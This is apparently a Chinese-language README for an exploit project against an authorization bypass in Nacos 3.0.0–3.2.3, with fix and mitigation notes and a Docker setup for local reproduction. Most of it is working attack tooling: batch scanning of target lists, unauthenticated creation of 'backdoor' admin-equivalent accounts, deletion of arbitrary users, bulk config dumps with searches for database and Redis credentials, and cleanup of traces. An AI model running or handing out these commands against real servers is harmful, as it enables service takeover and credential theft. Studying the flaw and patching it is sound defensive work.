# Nacos 3.x 用户/角色管理接口权限绕过（鉴权作用域错配）

> 影响版本：Nacos 3.0.0 ~ 3.2.3 ｜ 修复版本：3.2.4+
> 危害等级：**严重** —— 默认部署下未授权创建管理员等价账户，完全接管 Nacos 服务端
>
> ⚠️ **本项目仅用于已授权的安全测试与研究，请勿用于未授权目标。**

---

## 0. TL;DR

```bash
# 一键检测（自动探测 API 真实入口, 支持 8080/8848 × ±/nacos）
python poc.py http://target:8080

# 批量检测 + 实时写入 Excel
python poc.py -f targets.txt -o result.xlsx -t 20

# 完整利用（创建随机账户 → 绑角色 → 授 *:rw → 登录拿 token）
python exp.py http://target:8848

# 直接创建账户 / 删除任意用户（未授权, 无需登录）
python exp.py http://target:8848 --create-user backdoor 'Bd@2026'
python exp.py http://target:8848 --del-user backdoor
```

---

## 1. 漏洞成因

Nacos 3.x 将 HTTP 鉴权按 `@Secured` 注解的 `apiType` 拆分为多条独立作用域（scope），由不同的 Servlet Filter 处理：

| 作用域 | 过滤器 | 配置项 | 默认值 |
|---|---|---|---|
| `ADMIN_API` | `AuthAdminFilter` | `nacos.core.auth.admin.enabled` | **true（开启）** |
| `OPEN_API` | `AuthFilter` | `nacos.core.auth.enabled` | **false（关闭）** |

`@Secured` 注解的 `apiType()` **默认值是 `OPEN_API`**：

```java
// auth/src/main/java/com/alibaba/nacos/auth/annotation/Secured.java
public @interface Secured {
    ApiType apiType() default ApiType.OPEN_API;   // ← 管理接口必须显式声明 ADMIN_API
    ...
}
```

而 3.0.0~3.2.3 中，用户/角色/权限管理控制器（`nacos-default-auth-plugin` 模块）的一批方法**漏标了 `apiType = ApiType.ADMIN_API`**：

```java
// UserControllerV3.java (3.2.3)
@Secured(resource = AuthConstants.CONSOLE_RESOURCE_NAME_PREFIX + "users",
    action = ActionTypes.WRITE)          // ← 缺少 apiType = ApiType.ADMIN_API
@PostMapping
public Result<String> createUser(@RequestParam String username, @RequestParam String password) {...}
```

受影响接口：

| 接口 | 路径 | 方法 |
|---|---|---|
| createUser / deleteUser | `/nacos/v3/auth/user` | POST / DELETE |
| createRole / deleteRole | `/nacos/v3/auth/role` | POST / DELETE |
| createPermission / deletePermission | `/nacos/v3/auth/permission` | POST / DELETE |

**鉴权分流逻辑**（`AuthFilter.isMatchFilter`）：

```java
// 漏标接口 apiType=OPEN_API → 不归 AuthAdminFilter 管
return !ApiType.ADMIN_API.equals(secured.apiType());   // AuthAdminFilter 跳过
// → 落入 AuthFilter → nacos.core.auth.enabled 默认 false → isAuthEnabled()=false
// → AbstractWebAuthFilter.doFilter: chain.doFilter() 直接放行
```

**结论**：本应受默认开启的 Admin 鉴权保护的管理接口，落入默认关闭的普通鉴权作用域——形成「鉴权作用域错配」。即使运维按最佳实践开启了 admin 鉴权，攻击者仍可**未授权**调用这批接口。

## 2. 利用链（4 步）

```
① POST /nacos/v3/auth/user         未授权创建用户
② POST /nacos/v3/auth/role         未授权创建角色并绑定用户
③ POST /nacos/v3/auth/permission   未授权给角色授 resource=* / action=rw
④ POST /nacos/v3/auth/user/login   正常登录获取 accessToken
```

两个关键绕过点：

1. **服务层硬编码拦截**：`NacosRoleServiceDirectImpl.addRole()` 禁止创建名为 `ROLE_ADMIN` 的内置角色 → 改用随机角色名（如 `pocrole_xxxx`）规避，再通过 `*` 通配资源拿到等价全量权限
2. **权限缓存延迟**：`nacos.core.auth.caching.enabled` 默认开启，用户/权限缓存有 ~15s 刷新延迟 → 刚创建的用户立即登录、刚授权的角色立即访问可能失败，需重试（本工具已内置）

成功利用后攻击者拥有管理员等价权限：读写全部命名空间配置（常含数据库/Redis/中间件凭据）、增删用户与角色、向客户端推送恶意配置。

## 3. 修复方案

**官方修复（Nacos ≥ 3.2.4）**：为受影响接口的 `@Secured` 注解补上 `apiType = ApiType.ADMIN_API`，使其纳入默认开启的 Admin 鉴权作用域。

**临时缓解（无法立即升级时）**：
- 开启 `nacos.core.auth.enabled=true`，让普通作用域鉴权也生效（漏标接口同样要求认证）
- 网络层面限制 8848 端口仅对可信内网开放
- 排查系统内是否已存在攻击者注入的异常账户/角色

## 4. PoC 用法（poc.py）

批量检测，自动探测 API 真实入口（目标给 8080 控制台地址也会自动尝试 8848；带 `#/login` 前端路由的 URL 自动剥离；`/nacos` 上下文自动补全）。

```bash
python poc.py http://target:8848                    # 单目标
python poc.py -f targets.txt                        # 文件导入(每行一个, 支持 # 注释)
python poc.py -f targets.txt -t 20                  # 并发 20
python poc.py -f targets.txt -o result.txt          # 实时写入 TXT(TSV)
python poc.py -f targets.txt -o result.xlsx         # 实时写入 Excel(需 openpyxl)
python poc.py -f targets.txt -o result.json         # 实时写入 JSON
python poc.py http://target:8848 --keep             # 保留测试用户(默认自动清理)
python poc.py http://target:8848 --timeout 15       # 请求超时
```

**流式写入**：每检测完一个目标立即写盘（不等全部完成），中途 Ctrl+C 或崩溃不丢已检出结果。

**判定标准**：

| 结果 | 含义 |
|---|---|
| `VULN` | 未授权创建用户成功（200 + code=0）→ 漏洞存在 |
| `SAFE` | 进入 Admin 鉴权流程（403）→ 已修复；或响应非 Nacos 特征 |
| `UNKNOWN` | 网络异常 / 响应异常，需人工确认 |

退出码：`0`=无漏洞，`1`=存在漏洞（方便接入编排工具）。

## 5. EXP 用法（exp.py）

```bash
# ── 利用链 ──
python exp.py http://target:8848                                # 随机账户一键利用
python exp.py http://target:8848 -u ghost -p Ghost@2026 -r role1  # 指定账户/角色

# ── 直接操作（未授权, 不跑利用链）──
python exp.py http://target:8848 --create-user backdoor 'Bd@2026'   # 创建后门账户
python exp.py http://target:8848 --del-user backdoor                # 删除任意用户
python exp.py http://target:8848 --del-role role1 ghost             # 解绑/删除角色

# ── 后渗透（利用后或 --login-only 复用账户）──
python exp.py http://target:8848 --info                        # 版本探测
python exp.py http://target:8848 --list-users                  # 列出全部用户(含 bcrypt 哈希)
python exp.py http://target:8848 --list-roles                  # 列出角色绑定
python exp.py http://target:8848 --list-configs                # 列出配置清单
python exp.py http://target:8848 --dump-config db.properties DEFAULT_GROUP  # 读单条配置
python exp.py http://target:8848 --down-configs                # 批量下载全部配置
python exp.py http://target:8848 --down-configs ".*\.properties$"  # 按正则过滤下载
python exp.py http://target:8848 --search-configs "jdbc|redis"  # 正则搜索配置
python exp.py http://target:8848 --sensitive                   # 内置关键词搜敏感信息
python exp.py http://target:8848 --cleanup                     # 清理本次利用痕迹

# ── 复用已有账户（已利用过的目标）──
python exp.py http://target:8848 -u ghost -p Ghost@2026 --login-only --list-users
```

下载目录结构：`nacos_dump/<目标>_<命名空间>_<随机>/<namespace>/<group>/<dataId>`，附 `_index.tsv` 索引清单。

## 6. 环境搭建（本地复现）

```bash
docker run -d --name nacos-vuln \
  -p 8848:8848 -p 9848:9848 -p 8080:8080 \
  -e MODE=standalone \
  -e NACOS_AUTH_TOKEN=SecretKey012345678901234567890123456789012345678901234567890123456789 \
  -e NACOS_AUTH_IDENTITY_KEY=serverIdentity \
  -e NACOS_AUTH_IDENTITY_VALUE=security \
  nacos/nacos-server:v3.2.3
```

要点：**不设 `NACOS_AUTH_ENABLE`**（保持默认 false）即复现默认部署场景；3.x 控制台端口已改为 **8080**，API 端口仍为 8848。

## 7. 免责声明

本项目仅供已授权的安全测试、安全研究与教学用途。使用者需确保对目标系统拥有合法测试授权。因使用本项目造成的任何后果由使用者自行承担。

---

*Author: th31ov3*
